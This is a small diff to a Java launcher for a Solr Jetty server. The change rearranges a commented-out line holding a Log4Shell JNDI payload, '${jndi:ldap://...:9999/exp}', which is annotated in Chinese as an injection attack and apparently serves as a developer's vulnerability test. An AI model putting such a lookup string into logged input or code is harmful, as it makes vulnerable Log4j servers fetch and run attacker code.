@@ -34,7 +34,7 @@ public class StartSolrJetty
   public static void main( String[] args )
   {
     //System.setProperty("solr.solr.home", "../../../example/solr");
-//    注入攻击logger.info("${jndi:ldap://192.168.31.37:9999/exp}");
+//    logger.info("${jndi:ldap://192.168.31.37:9999/exp}");//注入攻击
 
     Server server = new Server();
     ServerConnector connector = new ServerConnector(server, new HttpConnectionFactory());
